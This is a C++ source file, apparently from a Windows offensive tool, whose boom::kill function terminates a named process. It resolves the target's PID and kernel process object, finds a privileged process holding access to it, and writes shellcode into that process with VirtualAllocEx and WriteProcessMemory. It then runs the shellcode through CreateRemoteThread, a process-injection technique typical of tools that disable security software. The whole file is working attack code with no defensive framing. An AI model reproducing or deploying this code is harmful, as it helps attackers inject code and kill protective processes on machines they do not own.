#include "boom.hpp"
#include "shellcode.hpp"

boom* boom::_instance = nullptr;

boom* boom::instance()
{
	if (!_instance)
		_instance = new boom();
	return _instance;
}

BOOL boom::kill(const wchar_t* name)
{
	BOOL ret = FALSE;
	uint32_t pid = 0;
	HANDLE handle = nullptr;
	LPVOID address = nullptr;

	do
	{
		// Get Target ProcessId 
		pid = utils::GetPidByName(name);
		if (pid == 0)
		{
			break;
		}

		// find process object address
		uint64_t object = utils::FindProcessObject(pid);
		if (object == 0)
		{
			break;
		}

		// Find Process id With Access rights
		uint32_t id = utils::FindAccessibleProcess(object);
		if (id == 0)
		{
			break;
		}

		// open high access process
		handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
		if (handle == nullptr)
		{
			break;
		}

		// alloc shellcode space in high access process
		address = VirtualAllocEx(handle, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!address)
		{
			break;
		}

		// write shellcode
		SIZE_T bytes = 0;
		if (!WriteProcessMemory(handle, address, shellcode, sizeof(shellcode), &bytes))
		{
			break;
		}

		if (!WriteProcessMemory(handle, LPVOID((DWORD64)address + 1), &pid, sizeof(pid), &bytes))
		{
			break;
		}

		// run shellcode
		HANDLE thread = CreateRemoteThread(handle, nullptr, 0, (LPTHREAD_START_ROUTINE)address, 0, 0, NULL);
		if (thread != nullptr)
		{
			WaitForSingleObject(thread, INFINITE);
			CloseHandle(thread);
		}

		//printf("target:%d,high:%d\n", pid, id);
		//printf("address:0x%llx , thread:0x%llx\n", address, thread);

		ret = TRUE;
	} while (false);

	if (address)
	{
		VirtualFreeEx(handle, address, 0, MEM_RELEASE);
	}

	if (handle)
	{
		CloseHandle(handle);
	}

	return ret;
}
